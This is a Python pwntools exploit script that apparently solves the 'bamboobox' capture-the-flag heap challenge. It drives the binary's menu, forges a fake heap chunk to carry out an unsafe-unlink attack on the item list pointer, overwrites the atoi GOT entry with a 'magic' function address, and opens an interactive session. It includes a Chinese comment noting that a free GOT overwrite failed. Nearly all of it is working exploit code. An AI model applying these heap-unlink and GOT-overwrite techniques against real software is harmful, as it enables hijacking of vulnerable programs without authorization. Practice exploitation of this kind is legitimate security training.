#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level="debug")

p = process('./bamboobox')
elf = ELF('./bamboobox')
#gdb.attach(p, 'b menu')


def show():
	p.sendlineafter('Your choice:', '1')

def add(size, content):
	p.sendlineafter('Your choice:', '2')
	p.sendlineafter('Please enter the length of item name:',str(size))
	p.sendafter('Please enter the name of item:', content)

def change(index, size, content):
	p.sendlineafter('Your choice:','3')
	p.sendlineafter('Please enter the index of item:', str(index))
	p.sendlineafter('Please enter the length of item name:', str(size))
	p.sendafter('Please enter the new name of the item:', content)

def remove(index):
	p.sendlineafter('Your choice:', '4')
	p.sendlineafter('Please enter the index of item:', str(index))

magic  = 0x0000000000400d49
target = 0x00000000006020c8 # itemlist
atoi_got=elf.got['atoi']    # 
atoi_plt=elf.plt['atoi']    # 
system_=elf.got['atoi']    # 
free_got=elf.got['free']    # 0x602018 这里很迷，覆盖free的got表不好使。。

log.info('****************leak free_got******************')
log.info('atoi_got ---> p[%s] '%hex(atoi_got))
log.info('atoi_plt ---> p[%s] '%hex(atoi_plt))
log.info('free_got ---> p[%s] '%hex(free_got))
fakechunk  = p64(0) + p64(0x91)
fakechunk += p64(target - 0x18) + p64(target - 0x10)
fakechunk += 'a' * 0x70
fakechunk += p64(0x90) + p64(0xa0)

add(0x90,"aaaa")
add(0x90,"cccc")
add(0x10,"dddd")

change(0, 0xa0, fakechunk)
remove(1)
#change(0, 0x20, 'b'*0x18 + p64(free_got))
change(0, 0x20, 'b'*0x18 + p64(atoi_got))
change(0, 0x8, p64(magic))

remove(2)
p.interactive()
